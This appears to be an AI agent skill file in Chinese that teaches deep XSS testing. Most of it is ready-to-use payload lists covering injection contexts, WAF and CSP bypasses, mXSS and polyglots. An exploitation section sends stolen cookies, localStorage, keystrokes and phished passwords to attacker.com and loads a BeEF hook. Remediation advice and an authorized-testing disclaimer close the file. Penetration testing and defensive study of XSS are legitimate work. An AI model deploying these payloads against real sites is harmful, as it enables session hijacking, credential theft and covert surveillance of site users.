---
name: xss-testing
description: XSS跨站脚本攻击深度测试技能：覆盖反射/存储/DOM/mXSS/vXSS全类型、CSP绕过、WAF绕过、现代浏览器防护对抗、高级利用链
version: 2.0.0
---

# XSS跨站脚本深度测试技能

## 概述

XSS允许攻击者在受害者浏览器中执行恶意JavaScript。现代防护包括CSP（Content-Security-Policy）、浏览器XSS Auditor/XSS Filter、WAF输入过滤、HttpOnly Cookie、输出编码、Trusted Types、Sanitizer API等多层防御。本技能覆盖反射型、存储型、DOM型、mXSS、vXSS、Universal XSS全类型，从基础注入到CSP绕过、沙箱逃逸、浏览器最新特性对抗的完整方法论。

## 一、XSS完整攻击面

### 1.1 注入位置分类
| 位置 | 上下文 | 测试方法 |
|------|-------|---------|
| HTML标签之间 | `<div>USERINPUT</div>` | `<script>alert(1)</script>` |
| HTML属性值 | `<input value="USERINPUT">` | `" onfocus=alert(1) autofocus x="` |
| HTML属性名 | `<div USERINPUT>` | `onmouseover=alert(1)` |
| HTML标签名 | `<USERINPUT href="/">` | `img src=x onerror=alert(1)` |
| JavaScript块 | `<script>var x="USERINPUT"</script>` | `";alert(1);//` |
| JS字符串（单引号/双引号/反引号）| 同上 | 对应闭合+payload |
| JS注释内 | `var x=/*USERINPUT*/` | `*/alert(1);/*` |
| CSS样式 | `<style>body{color:USERINPUT}</style>` | `</style><script>alert(1)</script>` |
| CSS属性值 | `<div style="color:USERINPUT">` | `red;background:url(javascript:alert(1))` |
| URL属性（href/src/action）| `<a href="USERINPUT">` | `javascript:alert(1)` |
| JSON响应 | `{"name":"USERINPUT"}` | `"}</script><script>alert(1)</script>` |
| SVG/MathML | `<svg><script>alert(1)</script></svg>` | SVG命名空间不遵循HTML规则 |
| Markdown渲染 | 评论/文章渲染 | `[x](javascript:alert(1))`、`<img src=x onerror=alert(1)>` |
| 富文本编辑器 | UEditor/CKEditor/TinyMCE | 标签/事件白名单绕过 |
| POST/JSON参数 | API请求体 | JSON字段XSS、Content-Type变换 |
| URL Path | `/user/<USERINPUT>/profile` | 路径XSS、URL编码绕过 |
| Hash片段 | `#USERINPUT` | DOM XSS（不发往服务器） |
| Cookie | Cookie值回显 | Cookie注入+XSS |
| Referer/User-Agent | 日志/统计页面UA回显 | 日志XSS/HTTP头注入 |
| 自定义HTTP头 | X-Forwarded-For等 | 头注入XSS |
| iframe srcdoc | `<iframe srcdoc="USERINPUT">` | srcdoc注入 |
| Template字符串 | JS模板字面量 | `${alert(1)}` |

### 1.2 XSS类型扩展
- **反射型XSS（Reflected）**：URL参数即时回显
- **存储型XSS（Stored/Persistent）**：恶意代码存入数据库/文件
- **DOM型XSS**：前端JS直接操作DOM引入（不经过服务器）
- **mXSS（突变XSS）**：浏览器对innerHTML解析后发生突变
- **vXSS（VBScript XSS）**：IE兼容模式VBScript执行
- **Universal XSS（uXSS）**：浏览器/插件漏洞导致跨源
- **Self-XSS**：需诱导用户自己输入，结合CSRF组合利用
- **Blind XSS**：在后台管理页/日志中触发（无回显）
- **PDF XSS**：PDF生成中的XSS，浏览器打开执行JS
- **Flash XSS**：ActionScript中的XSS（老版本）
- **PostMessage XSS**：不安全的postMessage监听
- **WebWorker XSS**：Worker中执行脚本绕过CSP
- **Service Worker XSS**：注册恶意Service Worker持久化

## 二、上下文感知Payload生成

### 2.1 HTML标签之间（无过滤）
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen autofocus onfocus=alert(1)>
<iframe onload=alert(1) src=x>
<embed src=x onerror=alert(1)>
<object data=x onerror=alert(1)>
<bgsound src=x onerror=alert(1)>
<link rel=import href=data:text/html,<script>alert(1)</script>>
<form action=javascript:alert(1)><input type=submit>
<isindex action=javascript:alert(1) type=image>
```

### 2.2 HTML属性值中（双引号包裹）
```html
" onmouseover=alert(1) x="
" onfocus=alert(1) autofocus x="
" onload=alert(1) x="
" onerror=alert(1) x="
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
" onfocus=alert(1) "      （双引号闭合+事件）
" autofocus onfocus=alert(1) x="
" onpointerenter=alert(1) x="
" onanimationstart=alert(1) x="
```

### 2.3 HTML属性值中（单引号包裹）
```html
' onmouseover=alert(1) x='
'><script>alert(1)</script>
' onfocus=alert(1) autofocus x='
' onerror=alert(1) x='
```

### 2.4 无引号属性值
```html
 onmouseover=alert(1)
 onfocus=alert(1) autofocus
 onerror=alert(1)
 =alert(1)     （某些解析器允许属性值不带等号值）
```

### 2.5 JavaScript字符串中
```javascript
// 双引号字符串
";alert(1);//
";alert(1);"
";new Function`al\ert\`1\``//
";(alert)(1);//

// 单引号字符串
';alert(1);//
';alert(1);'

// 反引号模板字符串
`;alert(1);//
${alert(1)}    （ES6模板字符串注入）
`${alert(1)}`

// 括号内
x=new Function`al\ert\`1\``;
x=eval('ale'+'rt(1)');
setTimeout`al\ert\`1\``;
setInterval`al\ert\`1\``;
Function`al\ert\`1\```();

// JS行内事件处理器（不需要分号，自动分号插入ASI）
<img src=x onerror=alert(1)>
<a href="javascript:void(0)" onclick=alert(1)>click</a>
```

### 2.6 URL属性（javascript:/data:协议）
```html
<a href="javascript:alert(1)">click</a>
<a href="javascript:%61%6c%65%72%74%28%31%29">click</a>     (URL编码)
<a href="data:text/html,<script>alert(1)</script>">click</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
<iframe src="javascript:alert(1)">
<iframe src="data:text/html,<script>alert(1)</script>">
<embed src="javascript:alert(1)">
<object data="javascript:alert(1)">
<form action="javascript:alert(1)"><button>go</button></form>
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

### 2.7 CSS上下文中注入
```html
</style><script>alert(1)</script>
<style>@keyframes x{}b{animation:x onstart;}</style>
<style>*[x{}]{background:url(javascript:alert(1))}</style>
<div style="color:red;background:url(javascript:alert(1))">
<div style="background-image:url(javascript:alert(1))">
<div style="width:expression(alert(1))">     (IE only)
<style>body{background:url(javascript:alert(1))}</style>
<link rel=stylesheet href=data:,*%7bx:expression(alert(1))%7d>
```

### 2.8 DOM XSS Source-Sink映射
```javascript
// Sources（可被用户控制的输入点）
location.href / location.search / location.hash / location.pathname
document.URL / document.documentURI / document.referrer
window.name
postMessage data
localStorage/sessionStorage
document.cookie
AJAX/JSONP回调数据

// Sinks（危险输出点）
innerHTML / outerHTML / document.write() / document.writeln()
eval() / setTimeout() / setInterval() / new Function()
location / location.href / window.open()
element.src / element.href / element.action
jQuery: .html() / .append() / .prepend() / .after() / .before() / $(userInput)
Angular: [innerHTML] / {{expression}} / $eval()
Vue: v-html / {{mustache}}
React: dangerouslySetInnerHTML / href={userInput}

// DOM XSS示例
// URL: #<img src=x onerror=alert(1)>
document.getElementById('x').innerHTML = location.hash.slice(1);
// URL: ?q=<svg onload=alert(1)>
$('div').html(getParameter('q'));
```

## 三、WAF深度绕过技术

### 3.1 标签/事件大小写与变体
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=X ONERROR=alert(1)>
<svg oNloAd=alert(1)>
<ScRiPt sRc=x></ScRiPt>
```

### 3.2 标签内填充垃圾
```html
<img/****/src=x/****/onerror=alert(1)>
<img src=x onerror=alert(1)//////>
<img src=x onooooooooonerror=alert(1)>    (不可识别属性+事件)
<IMG SRC=xonerror=alert(1)>    (缺少空格，某些解析器识别)
<img/src=x onerror=alert(1)>
<img
src=x onerror=alert(1)>       (换行分隔)
<img%09src=x%09onerror=alert(1)>    (Tab)
<img%0asrc=x%0donerror=alert(1)>    (换行符)
```

### 3.3 事件处理程序变形
```html
<!-- 标准事件 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- 自动触发事件 -->
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- 少见事件（绕过WAF黑名单）-->
<svg onload=alert(1)>                    (SVG命名空间专属事件)
<animate onbegin=alert(1) attributeName=x dur=1s>
<set onbegin=alert(1) attributeName=x to=1 dur=1s>
<svg><animate onend=alert(1) attributeName=x dur=1s>
<body onpointerdown=alert(1)>
<div onwheel=alert(1)>
<details ontoggle=alert(1)>
<input oninput=alert(1)>
<object onerror=alert(1)>
<applet code=xxx onerror=alert(1)>
<vmlframe xmlns=vml onload=alert(1)>

<!-- 事件名变形 -->
<svg/onload=alert(1)>
<svg///onload=alert(1)>
<svg onload%09=alert(1)>
<svg onload%0a=alert(1)>
<svg ONLOAD=alert(1)>

<!-- 事件处理器换行 -->
<img src=x onerror
=alert(1)>
<img src=x onerror=&#10;alert(1)>
```

### 3.4 JavaScript字符串/函数混淆
```javascript
// 字符串拆分
<script>eval('al'+'ert(1)')</script>
<script>eval('al\x65rt(1)')</script>
<script>eval('al\u0065rt(1)')</script>
<script>eval('\141\154\145\162\164(1)')</script>     (八进制)
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>eval(atob('YWxlcnQoMSk='))</script>

// 函数调用变形
<script>window['alert'](1)</script>
<script>top['alert'](1)</script>
<script>self['alert'](1)</script>
<script>parent['alert'](1)</script>
<script>this['alert'](1)</script>
<script>globalThis['alert'](1)</script>
<script>[].filter.constructor('alert(1)')()</script>
<script>alert.call(null,1)</script>
<script>alert.apply(null,[1])</script>
<script>new (alert)(1)</script>
<script>(alert)(1)</script>
<script>({valueOf:alert})</script>
<script>Function('al'+'ert(1)')()</script>
<script>[].sort.constructor('alert(1)')()</script>

// 利用JS特性绕过括号过滤
<script>alert`1`</script>            (标签模板字符串)
<script>eval`al\ert\`1\``</script>
<script>setTimeout`alert\`1\``</script>
<script>Function`al\ert\`1\```()</script>
<script>location='javascript:alert\x281\x29'</script>

// 正则表达式
<script>location='javascript:/alert(1)/.source'</script>
```

### 3.5 编码绕过
**HTML实体编码（在HTML属性/文本中生效）：**
```html
<!-- 命名实体 -->
&lt;img src=x onerror=alert(1)&gt;

<!-- 十进制实体 -->
<img src=x onerror=&#97;lert(1)>
&#60;img src=x onerror=alert(1)&#62;

<!-- 十六进制实体 -->
<img src=x onerror=&#x61;lert(1)>
&#x3c;img src=x onerror=alert(1)&#x3e;

<!-- 属性中实体编码（on事件内） -->
<a href="&#106;avascript:alert(1)">click</a>
<img src=x onerror="&#97;lert(1)">
```

**Unicode编码：**
```html
<a href="&#x006A;avascript:alert(1)">click</a>
<iframe src="javascript:\u0061lert(1)">
<script>\u0061lert(1)</script>
```

**URL编码：**
```html
<a href="javascript:%61%6c%65%72%74%28%31%29">click</a>
<img src=x onerror="%61%6c%65%72%74%28%31%29">
```

**多重编码：**
```
%253Cimg%2520src=x%2520onerror=alert(1)%253E     （双重URL编码）
```

**UTF-7编码（IE/老浏览器）：**
```html
+ADw-img src=+ACI-x+ACI- onerror=+ACI-alert(1)+ACI-+AD4-
```

### 3.6 利用HTML解析器特性
```html
<!-- 无引号属性自动结束 -->
<img src=x onerror=alert(1) <b>
<a href=javascript:alert(1)>click</a>
<a href=javascript:alert(1) id=x>click</a>

<!-- 斜杠代替空格 -->
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>

<!-- 空字节（老IE）-->
<img src=x onerror=%00alert(1)>

<!-- 全角字符（某些过滤器未归一化）-->
<IMG SRC=X ONERROR=ａｌｅｒｔ（１）>   (全角括号/字符，部分浏览器识别)

<!-- Null字符截断 -->
<scr\0ipt>alert(1)</scr\0ipt>
```

### 3.7 SVG/MathML特殊命名空间
```html
<!-- SVG中script不需要严格闭合 -->
<svg><script>alert(1)</script></svg>
<svg><script>alert(1)<!-- （自动闭合）-->

<!-- SVG中可执行脚本变体 -->
<svg onload=alert(1)>
<svg><g onload=alert(1)>
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=javascript:alert(1)><rect width=100 height=100 /></a></svg>

<!-- SVG foreignObject嵌入HTML -->
<svg><foreignObject width=100 height=100><body xmlns=http://www.w3.org/1999/xhtml onclick=alert(1)></body></foreignObject></svg>

<!-- XML命名空间（.xht/.xml文件或XHTML）-->
<xml:script xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></xml:script>
```

### 3.8 Markdown/XSS组合
```markdown
![x](javascript:alert(1))
[x](javascript:alert(1))
[x](data:text/html,<script>alert(1)</script>)
[a](javascript:alert(1) "title")
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

## 四、CSP（Content-Security-Policy）绕过

### 4.1 CSP指令检测与分析
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```
关键指令：`script-src`、`object-src`、`base-uri`、`style-src`、`img-src`、`frame-src`、`connect-src`、`report-uri`

### 4.2 常见unsafe-inline/dynamic绕过
```javascript
// unsafe-inline允许的场景
<script>alert(1)</script>   // script-src含'unsafe-inline'

// unsafe-eval
eval('alert(1)')
new Function('alert(1)')()
setTimeout('alert(1)',0)
setInterval('alert(1)',0)

// strict-dynamic绕过（允许script标签中动态创建的脚本加载）
// 若有HTML注入点，注入<script src=//attacker.com/x.js>即可绕过script-src非白名单限制
<script src=//attacker.com/x.js></script>
```

### 4.3 JSONP端点绕过CSP
```javascript
// 若script-src为'self'，寻找同源JSONP端点
<script src="/api/jsonp?callback=alert"></script>
// 典型JSONP可利用端点
<script src="https://target.com/xxx?callback=alert"></script>
// 利用JSONP反射XSS
<script src="/jsonp?cb=%3C/script%3E%3Csvg%20onload=alert(1)%3E"></script>

// 知名站点JSONP端点
// 用于script-src白名单包含这些CDN/站点时
<script src="https://www.google.com/jsapi?callback=alert"></script>
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert"></script>
<script src="https://www.youtube.com/oembed?url=x&callback=alert"></script>
```

### 4.4 Angular/Vue/React特定绕过
```html
<!-- Angular 1.x ng-app sandbox escape -->
{{constructor.constructor('alert(1)')()}}
{{_l.constructor.prototype.valueOf=1,toString=1}}
{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}
{{$on.constructor('alert(1)')()}}
{{[].pop.constructor('alert(1)')()}}

<!-- Vue模板注入 -->
{{constructor.constructor('alert(1)')()}}

<!-- React dangerouslySetInnerHTML -->
// 已直接执行HTML，无需绕过
```

### 4.5 浏览器缓存/重定向绕过
```javascript
// 利用<meta>刷新
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">

// 利用<link rel=preload/as=script>预加载后执行
<link rel=preload as=script href=data:,alert(1)>

// Service Worker注册（持久化）
// 需要script-src 'self'或允许脚本的来源
navigator.serviceWorker.register('/sw.js');
```

### 4.6 利用允许的资源加载
```javascript
// 若script-src允许data:
<script src=data:text/javascript,alert(1)></script>
<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>

// 若script-src允许非安全URL scheme
<script src=javascript:alert(1)></script>

// 若允许unsafe-hashes/nonce/base64
// 需获取nonce值，DOM XSS场景下可读取nonce属性
<script nonce="abc123">alert(1)</script>
```

### 4.7 gadget链绕过（Script Gadgets）
利用页面已存在的合法JS库/代码片段作为"gadget"来执行任意JS。
```javascript
// jQuery/Vue/Angular等库代码可被用于执行表达式
// CSP strict-dynamic下只要一个合法脚本源，后续即可执行
<script src=/js/jquery.js></script>
<a href=x onfocus=eval(src) id=x autofocus>
// 配合jQuery选择器执行JS
$(x[y]);

// 利用polyfill/第三方库
<script src=https://cdn.jsdelivr.net/npm/lodash@4.17.15/lodash.min.js></script>
<script src=/js/angular.js></script>  // 配合Angular模板注入
```

### 4.8 CSP绕过辅助工具
- https://csp-evaluator.withgoogle.com/  （CSP策略评估）
- https://cspbypass.com/
- Burp CSP Auditor插件
- Google CSP Evaluator

## 五、高级利用技术

### 5.1 Cookie窃取与会话劫持
```javascript
// 基础Cookie窃取
<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
<script>fetch('http://attacker.com/steal',{method:'POST',body:document.cookie})</script>

// 绕过HttpOnly（无法直接读取HttpOnly Cookie，但可执行操作）
// 通过XSS执行CSRF、读取页面内容、操作页面

// 窃取localStorage/sessionStorage
<script>fetch('http://attacker.com/steal',{method:'POST',body:JSON.stringify(localStorage)})</script>
```

### 5.2 键盘记录
```javascript
<script>
document.onkeypress = function(e) {
    new Image().src = 'http://attacker.com/k?k=' + e.key + '&d=' + location.host;
}
</script>
```

### 5.3 钓鱼/凭据窃取
```javascript
// 注入伪造登录表单
<script>
document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999"><h1>登录过期</h1><form action=http://attacker.com/phish method=post>用户名:<input name=u><br>密码:<input name=p type=password><br><button>登录</button></form></div>';
</script>
```

### 5.4 浏览器劫持/BeEF框架
```html
<!-- BeEF hook脚本 -->
<script src=http://attacker.com:3000/hook.js></script>
<!-- BeEF功能：浏览器信息收集、内网扫描、端口扫描、键盘记录、钓鱼、社工、Metasploit模块联动 -->
```

### 5.5 Blind XSS（无回显XSS）
使用Blind XSS payload探测后台/日志页面：
```javascript
// 通用Blind XSS payload
"><script src=//attacker.com/xss.js></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'//attacker.com/xss.js\';document.body.appendChild(a)')
<img src=x onerror="s=document.createElement('script');s.src='//attacker.com/xss.js';document.body.appendChild(s)">

// 自动化工具
// XSS Hunter Express: https://github.com/mandatoryprogrammer/xsshunter-express
// ezXSS: https://github.com/ssl/ezXSS
// Blind XSS Polyglot:
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### 5.6 mXSS（突变XSS）
利用innerHTML赋值时浏览器HTML解析器对实体/标签的突变处理：
```javascript
// 场景：页面使用innerHTML显示用户输入，服务端做了标签过滤但未考虑突变
// 示例：过滤后看似安全的内容经innerHTML解析后变为可执行脚本
var x = '<listing>&lt;img src=x onerror=alert(1)&gt;</listing>';
element.innerHTML = x;
// 浏览器解析后突变，可能变为<listing><img src=x onerror=alert(1)></listing>

// mXSS常见触发
<xmp><svg/onload=alert(1)></xmp>
<listing><img src=x onerror=alert(1)></listing>
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

### 5.7 Polyglot XSS（跨上下文万能Payload）
```javascript
// 同时兼容多种上下文的Polyglot
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

<!-- 多语言Polyglot（HTML/JS/SQL/命令注入）-->
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/<script>alert(1)</script>;--

<!-- HTML+JS+URL polyglot -->
";alert(1);"<!--<script>alert(1)</script>-->
```

### 5.8 PostMessage XSS
```javascript
// 不安全的postMessage监听
window.addEventListener('message', function(e) {
    eval(e.data);  // 危险：直接eval消息内容
}, false);

// 利用：在任意站点发送恶意消息
<iframe src="https://target.com" onload="this.contentWindow.postMessage('alert(1)','*')">
```

### 5.9 Web Worker绕过CSP
```javascript
// Worker可绕过页面CSP，从其他源加载脚本
var w = new Worker('http://attacker.com/worker.js');
// worker.js: importScripts('http://attacker.com/x.js');

// 或Blob Worker
var b = new Blob(['importScripts("http://attacker.com/x.js")'],{type:'application/javascript'});
var u = URL.createObjectURL(b);
new Worker(u);
```

## 六、浏览器安全特性绕过

### 6.1 XSS Auditor/Chromium XSS Auditor绕过
（注：Chrome移除了XSS Auditor，但Edge/老版本仍需考虑）
```html
<!-- 反射XSS的某些变体 -->
<script>alert(1)</script>  → 被拦截
<scr<script>ipt>alert(1)</scr</script>ipt>  → 可能绕过

<!-- 参数拆分 -->
?a=<script&b=>alert(1)</script>    (HPP绕过)

<!-- 利用DOM XSS完全绕过 -->
<!-- DOM XSS不经过XSS Auditor检测 -->
```

### 6.2 HttpOnly Cookie绕过
无法直接读取HttpOnly Cookie，但可：
1. **CSRF代替**：直接以用户身份执行敏感操作
2. **页面读取**：通过XSS读取页面中包含CSRF token的表单提交
3. **中间人**：通过注入JS代理所有请求/响应
4. **浏览器漏洞**：通过浏览器RCE漏洞或uXSS读取HttpOnly Cookie

### 6.3 Cookie Prefix绕过
- `__Host-`前缀：Cookie必须有Secure、Path=/、无Domain
- `__Secure-`前缀：必须有Secure标记
绕过方法：通过XSS修改Cookie的攻击场景较少

### 6.4 iframe sandbox/导航限制
```html
<!-- sandbox allow-scripts允许执行JS但限制同源 -->
<iframe sandbox=allow-scripts srcdoc="<script>alert(1)</script>">

<!-- XSS in sandboxed iframe + top navigation -->
<script>if(top!=self)top.location=self.location</script>
```

### 6.5 Trusted Types绕过
```javascript
// Trusted Types要求使用TrustedHTML/TrustedScript/TrustedScriptURL
// 绕过：寻找页面中的DOM clobbering或类型混淆
// 若存在unsafeTT策略可利用
trustedTypes.createPolicy('default', {createHTML: s => s});
```

## 七、工具链

### 7.1 扫描工具
| 工具 | 用途 |
|------|------|
| XSS Hunter Express | Blind XSS平台 |
| ezXSS | Blind XSS平台 |
| Dalfox | 快速XSS扫描器，参数分析+WAF绕过 |
| XSStrike | XSS扫描+WAF绕过引擎 |
| wfuzz | Fuzz XSS payload |
| Burp Suite Pro Active Scan | 主动扫描 |
| Burp Dom-Invader | DOM XSS检测 |
| Burp Hackvertor | 编码标签辅助 |
| Gopherus/XSSyer | 辅助工具 |
| XSS Polyglot | 万能Payload |

### 7.2 Dalfox高级用法
```bash
# 基础扫描
dalfox url "http://target.com/page?q=test"

# 深度扫描+Blind XSS
dalfox url "http://target/page?q=test" --blind https://attacker.xss.ht --remote-payloads portswigger,payloadbox

# POST请求扫描
dalfox url "http://target/login" -X POST -d "username=test&password=test"

# 自定义Payload
dalfox url "http://target/page?q=test" --custom-payload payloads.txt

# 忽略证书+代理+多参数
dalfox url "http://target/page" --proxy http://127.0.0.1:8080 --follow-redirects -F

# WAF绕过+无头检测
dalfox url "http://target/page?q=test" --waf-evasion --headless
```

### 7.3 XSStrike使用
```bash
# 基础扫描
python xsstrike.py -u "http://target.com/page?q=test"

# POST扫描
python xsstrike.py -u "http://target/page" --data "q=test"

# 爬行+扫描
python xsstrike.py -u "http://target.com" --crawl

# 盲打XSS
python xsstrike.py -u "http://target/page?q=test" --blind
```

### 7.4 Burp辅助插件
- **DOM Invader**：内置DOM XSS实时检测
- **Hackvertor**：标签化编码/解码，快速构造绕过
- **Reflected Parameters**：发现隐藏反射参数
- **Logger++**：全面记录所有请求响应

## 八、XSS测试清单

- [ ] 所有输入点（URL/POST/Header/Cookie/Path/Hash）
- [ ] 所有上下文（HTML/属性/JS/CSS/URL/Markdown/SVG）
- [ ] 反射型+存储型+DOM型全类型
- [ ] Blind XSS（后台/日志/api文档）
- [ ] 基础Payload测试（script/img/svg/body）
- [ ] 事件处理程序枚举
- [ ] 大小写/编码/注释/空白符绕过
- [ ] CSP策略评估与绕过（JSONP/gadget/dynamic/data:）
- [ ] 富文本编辑器XSS
- [ ] 文件上传回显XSS（文件名/文件内容/SVG文件）
- [ ] Flash/PDF/Office文件XSS
- [ ] PostMessage不安全监听
- [ ] mXSS/vXSS突变测试
- [ ] Cookie窃取/BeEF hook验证
- [ ] WAF绕过（编码/混淆/协议变形）
- [ ] DOM XSS source-sink审计
- [ ] Angular/Vue/React模板注入
- [ ] Web Worker/Service Worker持久化

## 九、修复建议

- **输出编码**：根据上下文（HTML/HTML属性/JS/URL/CSS）使用正确的编码函数
- **Content-Security-Policy**：配置严格的CSP（default-src 'self'、禁止unsafe-inline/unsafe-eval、使用nonce/hash）
- **HttpOnly + Secure + SameSite Cookie**：Cookie标记安全属性
- **Trusted Types**：启用Trusted Types阻止危险DOM操作
- **输入验证**：白名单验证用户输入
- **X-XSS-Protection**：已移除，不依赖
- **Sanitizer API**：使用DOMPurify等库进行HTML净化
- **富文本过滤**：使用白名单标签+属性净化（DOMPurify/sanitize-html）
- **框架内置防护**：React/Vue/Angular默认转义，避免使用dangerouslySetInnerHTML/v-html/[innerHTML]
- **避免危险API**：尽量不使用innerHTML/document.write/eval/setTimeout(string)

## 注意事项

- **仅限授权测试**：XSS测试可能造成页面弹窗/跳转影响用户体验，测试前确认范围
- **Cookie安全**：测试Cookie窃取时注意不要泄露真实用户数据
- **存储型XSS危害更大**：注意存储型XSS会影响所有访问用户，测试时标注并在测试后清理
- **Blind XSS等待时间**：后台XSS可能延迟触发，等待时间需足够
- **浏览器差异**：不同浏览器对HTML/JS解析存在差异，需多浏览器验证
- **CSP严格模式**：现代站点CSP逐渐严格，需利用JSONP/gadget链绕过
- **合规要求**：遵守《网络安全法》，仅在授权范围内测试
